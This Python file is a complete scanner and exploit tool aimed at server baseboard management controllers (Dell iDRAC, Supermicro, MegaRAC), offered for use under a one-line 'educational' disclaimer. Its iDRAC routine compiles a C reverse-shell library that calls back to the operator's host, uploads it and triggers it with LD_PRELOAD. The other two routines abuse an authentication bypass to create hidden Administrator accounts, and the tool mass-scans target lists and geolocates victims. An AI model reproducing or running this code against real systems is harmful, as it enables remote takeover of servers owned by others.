#!/usr/bin/env python3
# Multi-CVE BMC Exploit/Scan Framework: CVE-2018-1207 (iDRAC), CVE-2024-36435 (Supermicro), CVE-2024-54085 (MegaRAC)
# Interactive mode: Prompts for CVE (1, 2, 3), mode (1=scan, 2=exploit), and target (ip:port or file in scan mode).
# Stays in same CVE/mode on exploit failure, reprompts for target.
# Handles https:// and trailing /, defaults to port 443 if not specified.
# File targets without port expand to 443, 80, 8080, 8443, 623.
# Prints only vuln IPs in scan mode, pings with TCP fallback, fast threading with progress bar.
# Supermicro exploit prompts for username/password.
# Usage: python3 multicve.py [--no-vuln-check] [--no-geo] [--no-cleanup] [--no-listener] [--verbose]
# WARNING: For educational/research purposes only. Use on authorized systems.

import argparse
import base64
import json
import os
import random
import re
import requests
import socket
import struct
import subprocess
import sys
import time
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from tqdm import tqdm
import ipaddress

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TYPE_MAP = {
    '1': 'idrac',
    '2': 'supermicro',
    '3': 'megarac'
}

MODE_MAP = {
    '1': 'scan',
    '2': 'exploit'
}

CVE_NAMES = {
    'idrac': 'CVE-2018-1207',
    'supermicro': 'CVE-2024-36435',
    'megarac': 'CVE-2024-54085'
}

PORTS_TO_TRY = [443, 80, 8080, 8443, 623]

def is_private_ip(ip):
    """Check if IP is private (RFC 1918)."""
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False

def get_host_ip():
    """Get public IP via ifconfig.me with retry, fallback to manual input."""
    print_status("Detecting your public IP address...", "loading")
    for attempt in range(3):
        try:
            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
            if ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip) and ip != "127.0.0.1":
                print_status(f"Public IP detected: {ip}", "success")
                return ip
        except Exception:
            time.sleep(1)
    while True:
        ip = input("Enter your public IP (e.g., 203.0.113.1, not 127.0.0.1): ").strip()
        if ip and ip != "127.0.0.1" and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
            print_status(f"Using manual IP: {ip}", "success")
            return ip
        print_status("Invalid IP. Please enter a valid IPv4 address (not 127.0.0.1).", "error")

def get_random_port():
    """Generate random available port between 10000 and 65535."""
    for _ in range(10):
        port = random.randint(10000, 65535)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', port))
            s.close()
            return port
        except OSError:
            pass
    while True:
        port = input("Enter a port (10000-65535): ").strip()
        try:
            port = int(port)
            if 10000 <= port <= 65535:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind(('', port))
                    s.close()
                    return port
                except OSError:
                    print_status(f"Port {port} is in use.", "error")
            else:
                print_status("Port must be between 10000 and 65535.", "error")
        except ValueError:
            print_status("Invalid port. Enter a number between 10000 and 65535.", "error")

def print_banner():
    """Display a custom animated banner."""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    banner = """
    === MULTI-CVE BMC ATTACK SUITE ===
    """
    clear_screen()
    for line in banner.split('\n'):
        color = random.choice(colors)
        print_animated(line, delay=0.001, color=color)
    print_animated(f"{Fore.CYAN}[🔍] Scanner & Exploiter for BMC Vulnerabilities", delay=0.01)
    print_animated(f"{Fore.YELLOW}[⚡] iDRAC, Supermicro, MegaRAC", delay=0.01)
    print_animated(f"{Fore.MAGENTA}[🛠] Fast, Precise, Lethal", delay=0.01)
    print()

def print_status(message, status_type="info", verbose=False):
    """Print status messages with emojis, optional verbose output."""
    if status_type == "success":
        print(f"{Fore.GREEN}[✅] {message}")
    elif status_type == "error":
        print(f"{Fore.RED}[❌] {message}")
    elif status_type == "warning":
        print(f"{Fore.YELLOW}[⚠] {message}")
    elif status_type == "info":
        print(f"{Fore.CYAN}[ℹ] {message}")
    elif status_type == "loading":
        print(f"{Fore.CYAN}[⏳] {message}")
    elif status_type == "complete":
        print(f"{Fore.GREEN}[🚀] {message}")
    elif status_type == "geo":
        print(f"{Fore.MAGENTA}[🌍] {message}")
    elif status_type == "scan":
        print(f"{Fore.CYAN}[🔍] {message}")
    elif status_type == "vuln":
        print(f"{Fore.RED}[🔴] {message}")
    if verbose and status_type in ["error", "warning"]:
        print(f"{Fore.WHITE}[DEBUG] {message}")

def get_ip_geolocation(ip):
    """Get geolocation data for an IP address."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return data
    except Exception:
        pass
    return None

def display_geolocation(ip):
    """Display geolocation information for an IP address."""
    geo_data = get_ip_geolocation(ip)
    if geo_data:
        print_status(f"Target IP Location:", "geo")
        print(f"  {Fore.CYAN}➤ Country: {Fore.WHITE}{geo_data.get('country', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ Region: {Fore.WHITE}{geo_data.get('regionName', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ City: {Fore.WHITE}{geo_data.get('city', 'Unknown')}")
        print(f"  {Fore.CYAN}➤ ISP: {Fore.WHITE}{geo_data.get('isp', 'Unknown')}")
        return True
    else:
        print_status(f"Could not retrieve geolocation data for {ip}", "warning")
        return False

def ping_target(host, port=None, timeout=1):
    """Check reachability with ICMP or TCP ping (fallback)."""
    # Try ICMP ping first
    try:
        result = subprocess.run(['ping', '-c', '1', '-W', str(timeout), host], capture_output=True, text=True)
        if result.returncode == 0:
            return True
    except Exception:
        pass
    # Fallback to TCP ping if ICMP fails
    if port:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            pass
    return False

def prompt_type():
    """Prompt for CVE type."""
    print_status("Select CVE:", "info")
    print(f"{Fore.CYAN}[1] iDRAC - CVE-2018-1207")
    print(f"{Fore.CYAN}[2] Supermicro - CVE-2024-36435")
    print(f"{Fore.CYAN}[3] MegaRAC - CVE-2024-54085")
    while True:
        choice = input(f"{Fore.YELLOW}[?] Enter CVE number (1, 2, 3, or 'q' to quit): {Style.RESET_ALL}").strip().lower()
        if choice == 'q':
            print_status("Exiting.", "info")
            sys.exit(0)
        if choice in TYPE_MAP:
            return TYPE_MAP[choice]
        print_status("Invalid choice. Please enter 1, 2, 3, or 'q' to quit.", "error")

def prompt_mode():
    """Prompt for scan or exploit mode."""
    print_status("Select mode:", "info")
    print(f"{Fore.CYAN}[1] Scan")
    print(f"{Fore.CYAN}[2] Exploit")
    while True:
        mode = input(f"{Fore.YELLOW}[?] Enter mode (1=scan, 2=exploit, or 'q' to return to CVE selection): {Style.RESET_ALL}").strip().lower()
        if mode == 'q':
            return None
        if mode in MODE_MAP:
            return MODE_MAP[mode]
        print_status("Invalid mode. Please enter 1, 2, or 'q' to return to CVE selection.", "error")

def prompt_target_or_file():
    """Prompt for single target or file in scan mode, scan immediately."""
    target_input = input(f"{Fore.YELLOW}[?] Enter file name or single ip:port (e.g., targets.txt or 192.168.1.100:443): {Style.RESET_ALL}").strip().lower()
    target_input = re.sub(r'^(https?://)?', '', target_input).rstrip('/')
    if target_input.endswith('.txt'):
        targets = load_targets(target_input)
        if not targets:
            print_status(f"No valid targets in {target_input}. Exiting.", "error")
            sys.exit(1)
        return targets
    else:
        if ':' not in target_input:
            target_input = f"{target_input}:443"
        try:
            host, port = target_input.split(':')
            port = int(port)
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
                return [target_input]
            print_status("Invalid IP address.", "error")
            sys.exit(1)
        except ValueError:
            print_status("Invalid input. Use file.txt or ip:port.", "error")
            sys.exit(1)

def prompt_target():
    """Prompt for target, handle https:// and trailing /, default to port 443."""
    while True:
        target = input(f"{Fore.YELLOW}[?] Target (ip:port or ip, e.g., 192.168.1.100:443 or 192.168.1.100, or 'q' to return): {Style.RESET_ALL}").strip().lower()
        if target == 'q':
            return None, None
        target = re.sub(r'^(https?://)?', '', target).rstrip('/')
        if ':' not in target:
            target = f"{target}:443"
        try:
            host, port = target.split(':')
            port = int(port)
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
                return host, port
            print_status("Invalid IP address. Please use a valid IPv4 address, e.g., 192.168.1.100.", "error")
        except ValueError:
            print_status("Invalid port. Please use ip:port or ip format (port defaults to 443), or 'q' to return.", "error")

def prompt_credentials():
    """Prompt for username and password, validate input."""
    while True:
        username = input(f"{Fore.YELLOW}[?] Enter username (1-16 characters, alphanumeric): {Style.RESET_ALL}").strip()
        if 1 <= len(username) <= 16 and username.isalnum():
            break
        print_status("Invalid username. Must be 1-16 alphanumeric characters.", "error")
    while True:
        password = input(f"{Fore.YELLOW}[?] Enter password (1-16 characters): {Style.RESET_ALL}").strip()
        if 1 <= len(password) <= 16:
            break
        print_status("Invalid password. Must be 1-16 characters.", "error")
    return username, password

def load_targets(file_path):
    """Load targets from file, handle https:// and trailing /, expand no-port to multiple ports."""
    if not os.path.exists(file_path):
        print_status(f"File {file_path} not found.", "error")
        return []
    with open(file_path, 'r') as f:
        targets = [re.sub(r'^(https?://)?', '', line.strip()).rstrip('/') for line in f if line.strip()]
        expanded_targets = []
        for target in targets:
            if ':' not in target:
                for port in PORTS_TO_TRY:
                    expanded_targets.append(f"{target}:{port}")
            else:
                expanded_targets.append(target)
        valid_targets = []
        for target in expanded_targets:
            try:
                host, port = target.split(':')
                port = int(port)
                if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
                    valid_targets.append(target)
            except ValueError:
                pass
        return valid_targets

def check_idrac_vuln(host, port, verbose=False):
    """Check for CVE-2018-1207 vulnerability with enhanced detection."""
    url = f"https://{host}:{port}"
    try:
        r = requests.get(url + '/cgi-bin/login?LD_DEBUG=files', verify=False, timeout=5)
        if re.search(r'calling init: /lib/', r.text):
            print_status(f"iDRAC {host}:{port} vulnerable (pattern match)", "vuln", verbose)
            return True
        # Fallback: Check firmware version or headers for vulnerability indication
        r = requests.get(url + '/data?item=SystemInfo', verify=False, timeout=5)
        if r.status_code == 200 and 'FirmwareVersion' in r.text and float(r.text.split('FirmwareVersion')[1].split('"')[2].split('.')[0]) < 2.52:
            print_status(f"iDRAC {host}:{port} vulnerable (firmware < 2.52)", "vuln", verbose)
            return True
    except requests.exceptions.RequestException as e:
        print_status(f"iDRAC check failed for {host}:{port}: {str(e)}", "error", verbose)
    except ValueError:
        print_status(f"iDRAC firmware parse failed for {host}:{port}", "warning", verbose)
    return False

def check_supermicro_vuln(host, port, verbose=False):
    """Check for CVE-2024-36435 vulnerability."""
    url = f"https://{host}:{port}/cgi/login.cgi"
    try:
        r = requests.get(url, verify=False, timeout=1.5)
        return r.status_code == 200 and ('Supermicro' in r.text or 'ATEN International' in r.text)
    except Exception:
        return False

def check_megarac_vuln(host, port, verbose=False):
    """Check for CVE-2024-54085 vulnerability."""
    url = f"https://{host}:{port}/redfish/v1/AccountService/Accounts"
    headers = {'X-Server-Addr': '127.0.0.1:'}
    try:
        r = requests.post(url, json={}, verify=False, headers=headers, timeout=1.5)
        return r.status_code in [400, 405]
    except Exception:
        return False

def scan_targets(targets, vuln_type, verbose=False):
    """Scan multiple targets for vulnerability with threading for speed."""
    check_func = {
        'idrac': check_idrac_vuln,
        'supermicro': check_supermicro_vuln,
        'megarac': check_megarac_vuln
    }[vuln_type]
    
    def scan_single(target):
        try:
            host, port = target.split(':')
            port = int(port)
            if ping_target(host, port) and check_func(host, port, verbose):
                print(f"{Fore.RED}{target} vuln")
                return target
        except ValueError:
            pass
        return None

    max_workers = min(os.cpu_count() * 2 or 8, 20)
    vulnerable_targets = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(scan_single, target) for target in targets]
        for future in tqdm(as_completed(futures), total=len(targets), desc="Scanning", unit="target"):
            result = future.result()
            if result:
                vulnerable_targets.append(result)
    return vulnerable_targets

def save_vulnerable_targets(vulnerable_targets, vuln_type):
    """Save vulnerable targets to a file."""
    if not vulnerable_targets:
        return False
    output_file = f"vulnerable_{vuln_type}.txt"
    try:
        with open(output_file, 'w') as f:
            for target in vulnerable_targets:
                f.write(f"{target}\n")
        print_status(f"Saved {len(vulnerable_targets)} vulnerable targets to {output_file}", "success")
        return True
    except Exception as e:
        print_status(f"Error saving vulnerable targets: {e}", "error")
        return False

def start_netcat_listener(port):
    """Start a netcat listener in a separate thread."""
    print_status(f"Starting netcat listener on port {port}...", "loading")
    def run_netcat():
        try:
            if os.name == 'nt':
                subprocess.run(['ncat', '-v', '-l', '-p', str(port)])
            else:
                subprocess.run(['nc', '-v', '-l', '-p', str(port)])
        except Exception:
            pass
    listener_thread = threading.Thread(target=run_netcat)
    listener_thread.daemon = True
    listener_thread.start()
    time.sleep(1)  # Allow listener to start
    print_status(f"Netcat listener started on port {port}", "success")
    return listener_thread

def exploit_idrac(host, port, no_vuln_check, no_geo, no_listener, no_cleanup, lhost=None, lport=None, verbose=False):
    """Exploit CVE-2018-1207 with reverse shell."""
    if not ping_target(host, port):
        print_status(f"Can't connect to {host}:{port}: Unreachable.", "error", verbose)
        return False
    if not no_geo:
        display_geolocation(host)
        print()
    if not lhost:
        lhost = get_host_ip()
        if not lhost:
            print_status("Failed to auto-detect IP. Please specify with --lhost.", "error", verbose)
            return False
    if not lport:
        lport = get_random_port()
    print_status(f"Target: https://{host}:{port}", "info", verbose)
    print_status(f"Reverse Shell: {lhost}:{lport}", "info", verbose)
    print_status(f"Exploiting {CVE_NAMES['idrac']} on iDRAC...", "loading", verbose)

    if not no_listener:
        try:
            start_netcat_listener(lport)
        except Exception as e:
            print_status(f"Failed to start netcat listener: {e}", "error", verbose)
            print_status(f"Start manually: nc -v -l -p {lport}", "warning", verbose)
    else:
        print_status(f"Skipping listener due to --no-listener. Start manually: nc -v -l -p {lport}", "info", verbose)

    if not no_vuln_check:
        if not check_idrac_vuln(host, port, verbose):
            print_status(f"Target not vulnerable to {CVE_NAMES['idrac']}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status(f"Target vulnerable to {CVE_NAMES['idrac']}.", "success", verbose)

    payloadc = 'payload.c'
    payloadbin = 'payload.so'
    payload = f"""
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
static void main(void) __attribute__((constructor));
static void main(void)
{{
    int pid = fork();
    if(!pid) {{
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr = {{0}};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons({lport});
        serv_addr.sin_addr.s_addr = inet_addr("{lhost}");
        connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "/bin/sh", NULL);
    }}
}}
"""
    try:
        if subprocess.run(['which', 'sh4-linux-gnu-gcc-11'], capture_output=True).returncode != 0:
            print_status("sh4-linux-gnu-gcc-11 not found. Install with 'sudo apt install gcc-11-sh4-linux-gnu'.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status("Generating payload...", "loading", verbose)
        with open(payloadc, 'w') as f:
            f.write(payload)
        print_status("Payload source created.", "success", verbose)
        cmd = ['sh4-linux-gnu-gcc-11', '-shared', '-fPIC', payloadc, '-o', payloadbin]
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print_status(f"Payload compilation failed: {result.stderr.decode()}", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status("Payload compiled.", "success", verbose)
    except Exception as e:
        print_status(f"Error generating payload: {e}", "error", verbose)
        print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
        return False

    print_status("Uploading payload...", "loading", verbose)
    try:
        with open(payloadbin, 'rb') as f:
            payload_so = f.read()
        f_alias = 'RACPKSSHAUTHKEY1'
        res = bytes((f_alias + (32 - len(f_alias)) * '\0'), 'utf-8')
        res += struct.pack('<L', len(payload_so))
        res += struct.pack('<L', 1)
        res += payload_so
        for _ in tqdm(range(100), desc="Uploading", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET)):
            time.sleep(0.01)
        r = requests.post(f"https://{host}:{port}/cgi-bin/putfile", data=res, verify=False, timeout=10)
        if r.status_code != 200:
            print_status(f"Payload upload failed: HTTP {r.status_code}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status("Payload uploaded.", "success", verbose)
    except Exception as e:
        print_status(f"Payload upload failed: {e}", "error", verbose)
        print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
        return False

    print_status("Triggering exploit...", "loading", verbose)
    for i in range(5, 0, -1):
        print(f"{Fore.YELLOW}Launching in {i} seconds...{Style.RESET_ALL}", end='\r')
        time.sleep(1)
    print(f"{Fore.GREEN}Executing now!{Style.RESET_ALL}".ljust(30))
    try:
        r = requests.get(f"https://{host}:{port}/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp", verify=False, timeout=10)
        print_status("Exploit triggered.", "complete", verbose)
    except requests.exceptions.ReadTimeout:
        print_status("Timeout - normal if exploit succeeded.", "info", verbose)
    except Exception as e:
        print_status(f"Exploit trigger failed: {e}", "error", verbose)
        print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
        return False

    if not no_cleanup:
        try:
            for file in [payloadc, payloadbin]:
                if os.path.exists(file):
                    os.unlink(file)
            print_status("Cleaned up temporary files.", "success", verbose)
        except Exception as e:
            print_status(f"Cleanup failed: {e}", "error", verbose)
    print_status(f"Check listener: nc -v -l -p {lport}", "info", verbose)
    return True

def exploit_supermicro(host, port, no_vuln_check, no_geo, no_listener, lhost=None, lport=None, verbose=False):
    """Exploit CVE-2024-36435 by creating an admin account."""
    if not ping_target(host, port):
        print_status(f"Can't connect to {host}:{port}: Unreachable.", "error", verbose)
        return False
    if not no_geo:
        display_geolocation(host)
        print()
    if not lhost:
        lhost = get_host_ip()
        if not lhost:
            print_status("Failed to auto-detect IP. Please specify with --lhost.", "error", verbose)
            return False
    if not lport:
        lport = get_random_port()
    print_status(f"Target: https://{host}:{port}", "info", verbose)
    print_status(f"Reverse Shell: {lhost}:{lport}", "info", verbose)
    print_status(f"Exploiting {CVE_NAMES['supermicro']} on Supermicro BMC...", "loading", verbose)

    if not no_listener:
        try:
            start_netcat_listener(lport)
        except Exception as e:
            print_status(f"Failed to start netcat listener: {e}", "error", verbose)
            print_status(f"Start manually: nc -v -l -p {lport}", "warning", verbose)
    else:
        print_status(f"Skipping listener due to --no-listener. Start manually: nc -v -l -p {lport}", "info", verbose)

    if not no_vuln_check:
        if not check_supermicro_vuln(host, port, verbose):
            print_status(f"Target not vulnerable to {CVE_NAMES['supermicro']}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status(f"Target vulnerable to {CVE_NAMES['supermicro']}.", "success", verbose)

    username, password = prompt_credentials()
    data = {
        'name': username,
        'pwd': password,
        'check': '1',
        'role': 'Administrator'
    }
    print_status("Creating account...", "loading", verbose)
    for _ in tqdm(range(100), desc="Uploading", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET)):
        time.sleep(0.01)
    for i in range(5, 0, -1):
        print(f"{Fore.YELLOW}Launching in {i} seconds...{Style.RESET_ALL}", end='\r')
        time.sleep(1)
    print(f"{Fore.GREEN}Executing now!{Style.RESET_ALL}".ljust(30))
    try:
        r = requests.post(f"https://{host}:{port}/cgi/login.cgi", data=data, verify=False, timeout=1.5)
        if r.status_code == 200 and 'success' in r.text.lower():
            print_status("Account created!", "success", verbose)
            print(f"{Fore.CYAN}Username: {Fore.WHITE}{username}")
            print(f"{Fore.CYAN}Password: {Fore.WHITE}{password}")
            print_status(f"Check listener: nc -v -l -p {lport}", "info", verbose)
            return True
        else:
            print_status(f"Account creation failed: HTTP {r.status_code}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
    except Exception as e:
        print_status(f"Account creation failed: {e}", "error", verbose)
        print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
        return False

def exploit_megarac(host, port, no_vuln_check, no_geo, no_listener, lhost=None, lport=None, verbose=False):
    """Exploit CVE-2024-54085 with account creation."""
    if not ping_target(host, port):
        print_status(f"Can't connect to {host}:{port}: Unreachable.", "error", verbose)
        return False
    if not no_geo:
        display_geolocation(host)
        print()
    if not lhost:
        lhost = get_host_ip()
        if not lhost:
            print_status("Failed to auto-detect IP. Please specify with --lhost.", "error", verbose)
            return False
    if not lport:
        lport = get_random_port()
    print_status(f"Target: https://{host}:{port}", "info", verbose)
    print_status(f"Reverse Shell: {lhost}:{lport}", "info", verbose)
    print_status(f"Exploiting {CVE_NAMES['megarac']} on MegaRAC...", "loading", verbose)

    if not no_listener:
        try:
            start_netcat_listener(lport)
        except Exception as e:
            print_status(f"Failed to start netcat listener: {e}", "error", verbose)
            print_status(f"Start manually: nc -v -l -p {lport}", "warning", verbose)
    else:
        print_status(f"Skipping listener due to --no-listener. Start manually: nc -v -l -p {lport}", "info", verbose)

    if not no_vuln_check:
        if not check_megarac_vuln(host, port, verbose):
            print_status(f"Target not vulnerable to {CVE_NAMES['megarac']}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
        print_status(f"Target vulnerable to {CVE_NAMES['megarac']}.", "success", verbose)

    username, password = prompt_credentials()
    headers = {'X-Server-Addr': '127.0.0.1:'}
    print_status("Creating account...", "loading", verbose)
    for _ in tqdm(range(100), desc="Uploading", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET)):
        time.sleep(0.01)
    for i in range(5, 0, -1):
        print(f"{Fore.YELLOW}Launching in {i} seconds...{Style.RESET_ALL}", end='\r')
        time.sleep(1)
    print(f"{Fore.GREEN}Executing now!{Style.RESET_ALL}".ljust(30))
    try:
        response = requests.post(
            f"https://{host}:{port}/redfish/v1/AccountService/Accounts",
            json={
                'Name': 'Compromised Account',
                'Description': 'Compromised Account',
                'Enabled': True,
                'Password': password,
                'UserName': username,
                'RoleId': 'Administrator',
                'Locked': False,
                'PasswordChangeRequired': False
            },
            verify=False,
            headers=headers,
            timeout=1.5
        )
        resp_json = response.json() if response.text else {}
        if resp_json.get("UserName") == username:
            print_status("Account created!", "success", verbose)
            print(f"{Fore.CYAN}Username: {Fore.WHITE}{username}")
            print(f"{Fore.CYAN}Password: {Fore.WHITE}{password}")
            print_status(f"Check listener: nc -v -l -p {lport}", "info", verbose)
            return True
        else:
            print_status(f"Account creation failed: HTTP {response.status_code}.", "error", verbose)
            print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
            return False
    except Exception as e:
        print_status(f"Account creation failed: {e}", "error", verbose)
        print_status(f"Check listener anyway: nc -v -l -p {lport}", "info", verbose)
        return False

def clear_screen():
    """Clear the terminal screen based on OS."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_animated(text, delay=0.02, color=Fore.WHITE):
    """Print text with animation effect."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print()

def main():
    parser = argparse.ArgumentParser(description="Multi-CVE BMC Exploit/Scan Framework")
    parser.add_argument("--no-vuln-check", action="store_true", help="Skip vuln check in exploit mode")
    parser.add_argument("--no-geo", action="store_true", help="Skip geolocation lookup")
    parser.add_argument("--no-cleanup", action="store_true", help="Skip cleanup of temporary files")
    parser.add_argument("--no-listener", action="store_true", help="Skip starting netcat listener")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output for debugging")
    parser.add_argument("--lhost", help="Local host IP for reverse shell")
    parser.add_argument("--lport", type=int, help="Local port for reverse shell")
    args = parser.parse_args()

    print_banner()
    while True:
        vuln_type = prompt_type()
        while True:
            mode = prompt_mode()
            if mode is None:
                break
            if mode == 'scan':
                targets = prompt_target_or_file()
                if targets:
                    vulnerable_targets = scan_targets(targets, vuln_type, args.verbose)
                    if vulnerable_targets:
                        save_vulnerable_targets(vulnerable_targets, vuln_type)
                        exploit_now = input(f"{Fore.YELLOW}[?] Exploit one of these targets now? (y/n): {Style.RESET_ALL}").strip().lower()
                        if exploit_now == 'y':
                            try:
                                target_index = int(input(f"{Fore.YELLOW}[?] Enter target number (1-{len(vulnerable_targets)}): {Style.RESET_ALL}")) - 1
                                if 0 <= target_index < len(vulnerable_targets):
                                    host, port = vulnerable_targets[target_index].split(':')
                                    port = int(port)
                                    print_status(f"Selected target: {host}:{port}", "info", args.verbose)
                                    # Call the exploit function for the selected CVE
                                    if vuln_type == 'idrac':
                                        exploit_idrac(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.no_cleanup, args.lhost, args.lport, args.verbose)
                                    elif vuln_type == 'supermicro':
                                        exploit_supermicro(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.lhost, args.lport, args.verbose)
                                    else:
                                        exploit_megarac(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.lhost, args.lport, args.verbose)
                                else:
                                    print_status("Invalid target number. Exiting.", "error", args.verbose)
                                    sys.exit(0)
                            except ValueError:
                                print_status("Invalid input. Exiting.", "error", args.verbose)
                                sys.exit(0)
                    sys.exit(0)
            else:
                while True:
                    host, port = prompt_target()
                    if host is None and port is None:
                        break
                    success = False
                    if vuln_type == 'idrac':
                        success = exploit_idrac(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.no_cleanup, args.lhost, args.lport, args.verbose)
                    elif vuln_type == 'supermicro':
                        success = exploit_supermicro(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.lhost, args.lport, args.verbose)
                    else:
                        success = exploit_megarac(host, port, args.no_vuln_check, args.no_geo, args.no_listener, args.lhost, args.lport, args.verbose)
                    if not success:
                        print_status("Exploit failed. Try another target?", "warning", args.verbose)
                        continue
                    print_status("Exploit completed. Try another target?", "complete", args.verbose)
                    if not args.no_listener:
                        print_status("Keeping script running for listener. Press Ctrl+C to exit.", "info", args.verbose)
                        try:
                            while True:
                                time.sleep(1)
                        except KeyboardInterrupt:
                            print(f"\n{Fore.RED}[❌] Operation cancelled by user{Style.RESET_ALL}")
                            break
    print(f"\n{Fore.CYAN}[🌟] Thanks for using Multi-CVE Framework!{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[❌] Operation cancelled by user{Style.RESET_ALL}")
        sys.exit(0)
